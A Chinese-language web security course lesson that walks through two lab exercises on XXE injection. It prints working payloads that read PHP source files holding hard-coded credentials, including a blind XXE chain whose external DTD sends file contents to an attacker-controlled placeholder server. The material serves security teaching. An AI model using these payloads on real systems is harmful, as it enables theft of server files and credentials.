# 护网行动红蓝攻防教程：P45：web安全-21.课程考核讲解 📝

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_1.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_3.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_5.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_6.png)

在本节课中，我们将对上一节布置的课程考核题目进行讲解。我们将回顾两道关于XXE（XML外部实体注入）漏洞的实战题目，分析解题思路，并解决同学们在操作中遇到的实际问题。

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_8.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_10.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_12.png)

---

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_14.png)

## 第一题：有回显的XXE漏洞利用

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_16.png)

上一节我们介绍了XXE漏洞的基本原理，本节中我们来看看如何利用有回显的XXE漏洞获取敏感信息。

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_18.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_20.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_22.png)

### 解题步骤

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_24.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_26.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_27.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_29.png)

以下是利用有回显XXE漏洞读取服务器文件的核心步骤：

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_31.png)

1.  **抓包与探测**：首先使用Burp Suite等工具拦截登录请求数据包。尝试修改`username`字段的值，观察服务器响应中是否回显了输入的内容，以此判断是否存在XXE漏洞。
2.  **确认漏洞与读取文件**：确认存在XXE漏洞后，构造Payload读取服务器上处理登录逻辑的文件（例如`do_login.php`），以获取其中硬编码的账户密码。

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_33.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_35.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_37.png)

### 核心Payload解析

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_38.png)

用于读取文件的XXE Payload结构如下：

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY [
<!ENTITY remote SYSTEM "php://filter/convert.base64-encode/resource=do_login.php">
]>
<user>
    <username>&remote;</username>
    <password>123</password>
</user>
```

**代码解释**：
*   `<!ENTITY remote SYSTEM "...">`：定义一个名为`remote`的外部实体，其内容为指定文件（`do_login.php`）经过Base64编码后的数据。
*   `&remote;`：在`username`字段中引用该实体。由于漏洞存在回显，服务器处理后会将该实体的内容（即文件内容）返回在响应报文中。
*   收到Base64编码的响应后，进行解码即可获得文件明文内容。

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_40.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_42.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_43.png)

---

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_44.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_46.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_48.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_50.png)

## 第二题：无回显的XXE漏洞利用

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_51.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_52.png)

解决了有回显的情况后，本节我们来看看当服务器不直接返回数据时，如何利用无回显（Blind XXE）漏洞。

### 解题思路

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_54.png)

无回显XXE的核心思路是将目标服务器上的数据，通过HTTP请求“带出”到我们可控的服务器上，通过查看我们服务器的访问日志来获取信息。

### 操作流程

以下是实现无回显XXE攻击的关键流程：

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_56.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_57.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_59.png)

1.  **搭建恶意DTD服务器**：在自己的公网服务器上放置一个恶意的DTD文件。
2.  **构造攻击Payload**：向目标网站发送包含引用外部DTD的XML数据。
3.  **数据外带**：目标网站解析XML时，会加载我们服务器上的DTD文件。该DTD文件内包含读取目标服务器本地文件（如`do_login2.php`）并其内容作为参数，向我们的服务器发起HTTP请求的指令。
4.  **查看日志获取数据**：在我们服务器的访问日志中，可以看到目标服务器发来的请求，其URL中包含了文件内容的编码值，解码后即可获得敏感信息。

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_61.png)

### 核心文件与配置

**攻击Payload (发送给靶场)**：
```xml
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=do_login2.php">
<!ENTITY % dtd SYSTEM "http://你的服务器IP/evil.dtd">
%dtd;
%send;
]>
<user><username>test</username><password>test</password></user>
```

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_63.png)

**恶意DTD文件内容 (evil.dtd，放在你的服务器上)**：
```xml
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://你的服务器IP/?content=%file;'>">
%all;
```

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_65.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_67.png)

**服务器日志查看**：攻击成功后，在你的服务器（如Nginx）的访问日志文件（例如`/var/log/nginx/access.log`）中，可以找到类似`GET /?content=Base64编码内容`的请求记录，对其中的`content`参数值进行Base64解码即可获得文件内容。

---

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_69.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_71.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_72.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_74.png)

## 常见问题与解决方案

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_76.png)

在实操过程中，同学们遇到了一些典型问题，以下是问题汇总与解决方法：

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_78.png)

*   **问题：第二题Payload执行后，自己的服务器没有收到请求。**
    *   **检查点1**：确保Payload中DTD的URL（`http://你的服务器IP/evil.dtd`）是公网可访问的，不能使用`localhost`或`127.0.0.1`。
    *   **检查点2**：确保你的服务器防火墙开放了相应端口（如80端口），并且Web服务（如Nginx）运行正常。
    *   **检查点3**：检查DTD文件内容是否正确，特别是嵌套实体的语法。

*   **问题：读取文件路径错误。**
    *   **解决方案**：在DTD文件中，使用相对路径或绝对路径指定要读取的文件。例如，如果文件与漏洞页面在同一目录，直接使用文件名`do_login2.php`即可。避免使用`http://`协议再去访问，这属于文件包含的范畴，在单纯的XXE文件读取中不适用。

*   **问题：收不到实体中`SYSTEM`的请求。**
    *   **解决方案**：这通常是因为整个XXE Payload链没有正确闭合或调用。确保在Payload中正确使用`%dtd;`和`%send;`来调用DTD中定义的参数实体。仔细检查引号、百分号和分号的使用。

---

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_80.png)

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_81.png)

## 课程总结

本节课中我们一起学习了XXE漏洞在两种不同场景下的实战应用。

1.  **有回显XXE**：利用简单直接，通过定义外部实体并直接在回显位置引用，即可将服务器文件内容输出到响应中。
2.  **无回显XXE**：思路更为巧妙，需要结合远程DTD文件，将数据通过额外的HTTP请求外带到攻击者控制的服务器，通过日志间接获取信息。

![](img/05e5263c7d671163c0fe8a4b3f9d2e12_83.png)

通过这两道题的练习，希望大家能够掌握XXE漏洞从发现、确认到利用的完整过程，并理解不同场景下Payload的构造逻辑。遇到问题时，耐心检查Payload语法、网络可达性以及服务器配置是关键的排错步骤。